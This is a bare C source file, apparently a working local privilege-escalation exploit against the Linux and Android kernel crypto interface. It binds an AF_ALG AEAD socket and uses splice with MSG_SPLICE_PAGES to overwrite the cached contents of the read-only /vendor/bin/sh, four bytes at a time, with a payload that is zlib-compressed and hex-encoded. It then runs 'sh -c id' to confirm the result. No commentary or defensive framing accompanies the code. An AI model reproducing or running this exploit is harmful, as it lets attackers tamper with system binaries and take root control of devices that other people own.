#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <zlib.h>

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#define ALG_SET_IV 2
#define ALG_SET_OP 3
#define ALG_SET_AEAD_ASSOCLEN 4
#endif

#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000
#endif

static void hex2bin(const char *hex, unsigned char *out, size_t max_len) {
    size_t len = strlen(hex);
    if (len % 2) return;
    for (size_t i = 0; i < len/2 && i < max_len; i++) {
        sscanf(hex + 2*i, "%2hhx", &out[i]);
    }
}

static unsigned char* hex_to_bytes(const char *hex, size_t *out_len) {
    size_t hex_len = strlen(hex);
    *out_len = hex_len / 2;
    unsigned char *buf = (unsigned char*)malloc(*out_len);
    if (!buf) return NULL;
    hex2bin(hex, buf, *out_len);
    return buf;
}

static void trigger_aead(int file_fd, size_t offset, const unsigned char *chunk4) {
    int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (sock < 0) { perror("socket"); return; }

    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };
    if (bind(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("bind");
        close(sock);
        return;
    }

    int h = SOL_ALG;

    size_t key_len;
    unsigned char *key = hex_to_bytes(
        "0800010000000010"
        "0000000000000000000000000000000000000000000000000000000000000000"
        "0000000000000000000000000000000000000000",
        &key_len);
    if (key) {
        if (setsockopt(sock, h, ALG_SET_KEY, key, key_len) < 0)
            perror("setsockopt KEY");
        free(key);
    }

    int dummy = 0;
    if (setsockopt(sock, h, 5, &dummy, 4) < 0)
        perror("setsockopt 5");

    int conn = accept(sock, NULL, NULL);
    if (conn < 0) {
        perror("accept");
        close(sock);
        return;
    }

    unsigned char send_buf[8];
    memcpy(send_buf, "AAAA", 4);
    memcpy(send_buf + 4, chunk4, 4);

    struct iovec iov = { .iov_base = send_buf, .iov_len = 8 };
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_flags = MSG_SPLICE_PAGES
    };

    char cmsg_buf[CMSG_SPACE(sizeof(__u32)) * 4];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);

    cmsg->cmsg_level = h;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(4);
    __u32 op = 0;
    memcpy(CMSG_DATA(cmsg), &op, 4);

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = h;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(20);
    unsigned char iv[20] = {0x10, 0};
    memcpy(CMSG_DATA(cmsg), iv, 20);

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = h;
    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len = CMSG_LEN(4);
    __u32 assoclen = 8;
    memcpy(CMSG_DATA(cmsg), &assoclen, 4);

    if (sendmsg(conn, &msg, 0) < 0) {
        perror("sendmsg");
        close(conn);
        close(sock);
        return;
    }

    size_t splice_len = offset + 4;
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        close(conn);
        close(sock);
        return;
    }

    lseek(file_fd, 0, SEEK_SET);
    ssize_t ret = splice(file_fd, NULL, pipefd[1], NULL, splice_len, SPLICE_F_MOVE);
    if (ret != (ssize_t)splice_len) {
        perror("splice file->pipe");
    }

    ret = splice(pipefd[0], NULL, conn, NULL, splice_len, SPLICE_F_MOVE);
    if (ret != (ssize_t)splice_len) {
        perror("splice pipe->socket");
    }

    close(pipefd[0]);
    close(pipefd[1]);

    char recv_buf[8192];
    recv(conn, recv_buf, sizeof(recv_buf), 0);

    close(conn);
    close(sock);
}

int main() {
    const char *compressed_hex =
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";
    size_t comp_len;
    unsigned char *compressed = hex_to_bytes(compressed_hex, &comp_len);
    if (!compressed) {
        fprintf(stderr, "Failed to parse compressed hex\n");
        return 1;
    }

    uLongf decomp_len = 65536;
    unsigned char *decompressed = (unsigned char*)malloc(decomp_len);
    if (!decompressed) {
        free(compressed);
        return 1;
    }

    int ret = uncompress(decompressed, &decomp_len, compressed, comp_len);
    free(compressed);
    if (ret != Z_OK) {
        fprintf(stderr, "zlib decompress error: %d\n", ret);
        free(decompressed);
        return 1;
    }

    int file_fd = open("/vendor/bin/sh", O_RDONLY);
    if (file_fd < 0) {
        perror("open /vendor/bin/sh");
        free(decompressed);
        return 1;
    }

    for (size_t i = 0; i + 4 <= decomp_len; i += 4) {
        trigger_aead(file_fd, i, decompressed + i);
    }

    close(file_fd);
    free(decompressed);
    system("sh -c id");

    return 0;
}
